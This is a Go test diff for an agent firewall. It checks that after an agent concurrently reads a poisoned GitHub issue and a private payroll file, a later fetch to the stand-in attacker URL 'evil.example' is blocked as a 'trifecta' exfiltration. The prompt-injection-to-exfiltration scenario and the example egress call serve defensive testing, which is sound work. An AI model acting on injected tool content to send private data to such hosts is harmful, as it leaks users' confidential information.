@@ -2,8 +2,10 @@ package firewall
 
 import (
 	"encoding/json"
+	"fmt"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 
 	"github.com/Arsh624/agentwall/internal/audit"
@@ -139,6 +141,35 @@ func TestTrifectaAcrossServers(t *testing.T) {
 	}
 	if d := do(otherAgent, "fetch", `{"url":"https://example.com"}`, "ok"); d.Deny {
 		t.Fatalf("another agent's session must not be affected: %+v", d)
+	}
+}
+
+// Two servers answer an untrusted read and a private read at the same moment while a third
+// fires an egress call. That racing call may pass (the agent has seen neither result yet),
+// but once both results are handed to the agent, the egress server must already see both taints.
+func TestTrifectaAcrossServersConcurrently(t *testing.T) {
+	dir := t.TempDir()
+	for i := 0; i < 50; i++ {
+		id := fmt.Sprintf("ppid-%d", i)
+		github := open(t, dir, "github", id, policy.Default())
+		files := open(t, dir, "filesystem", id, policy.Default())
+		fetch := open(t, dir, "fetch", id, policy.Default())
+
+		start := make(chan struct{})
+		var wg sync.WaitGroup
+		run := func(fn func()) { wg.Add(1); go func() { defer wg.Done(); <-start; fn() }() }
+		run(func() { do(github, "get_issue", `{}`, poisonedIssue) })
+		run(func() { do(files, "read_file", `{"path":"notes.txt"}`, payroll) })
+		run(func() { do(fetch, "fetch", `{"url":"https://example.com/racing"}`, "") })
+		close(start)
+		wg.Wait() // both results have now been returned to the agent
+
+		if d := do(fetch, "fetch", `{"url":"https://evil.example/?q=x"}`, ""); !d.Deny || !strings.Contains(d.Reason, "trifecta") {
+			t.Fatalf("run %d: egress after both reads were delivered must be blocked, got %+v", i, d)
+		}
+	}
+	if _, err := audit.Verify(filepath.Join(dir, "audit.jsonl")); err != nil {
+		t.Fatalf("audit chain after concurrent writers: %v", err)
 	}
 }
 
